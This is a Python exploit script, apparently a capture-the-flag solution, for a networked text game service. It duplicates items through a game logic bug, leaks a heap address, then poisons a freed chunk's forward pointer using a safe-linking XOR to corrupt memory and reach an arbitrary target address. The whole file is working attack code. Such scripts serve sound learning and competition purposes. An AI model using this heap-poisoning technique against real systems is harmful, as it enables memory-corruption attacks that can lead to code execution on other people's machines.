#!/usr/bin/env python3
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
TARGET=int(sys.argv[3],16) if len(sys.argv)>3 else 0x4141414141414141
s=socket.socket(); s.settimeout(4); s.connect((HOST,PORT))
def rx(pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.02); return rx(pats,t)
print(rx("Great Plateau",3))
for i in range(5):
    cmd("shop buy 1 1",["tx: item added","not enough"])
    cmd("inv equip 1",["tx: main world equipped","invalid"])
    cmd("shop sell 1",["shop sold","invalid"])
    cmd("mw throw 0",["throws equipped item","invalid"])
    cmd("mw pickup 0",["tx: item added","invalid"])
    cmd("shop sell 1",["shop sold","invalid"])
    time.sleep(0.2)
cmd("shop buy 3 34",["tx:","not enough"],3)
cmd("map teleport castle",["Encounter"])
cmd("battle",["player turn"])
cmd("use item",["Enter inventory idx"])
cmd("1",["Enter quantity"])
cmd("34",["Battle won"],4)
cmd("mw pickup 0",["tx: item added","invalid"])
cmd("inv equip 1",["tx: main world equipped","invalid"])
o=cmd("mw show",["Drops:"])
m=re.search(r"description_addr=0x([0-9a-f]+)",o)
base=int(m.group(1),16)
print("[base] "+hex(base),flush=True)
cmd("inv drop 1",["inventory frees","invalid"])
fd=TARGET ^ (base>>12)
payload=struct.pack("<Q",fd).hex()
print("[poison fd] "+payload,flush=True)
cmd("mw whisper 0 "+payload,["whispered","only"])
print("[trigger throw]",flush=True)
o=cmd("mw throw 0",["throws","dropped","copied","no pointer","<EOF>"],3)
print("[throw out] "+o[-200:],flush=True)
time.sleep(0.3)
# try quit; may crash
try:
    s.sendall(b"quit\n"); time.sleep(0.3)
    s.settimeout(1); tail=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            tail+=d
    except Exception: pass
    print("[tail] "+repr(tail[:100]),flush=True)
except Exception as e:
    print("[quit err] "+str(e),flush=True)
s.close()
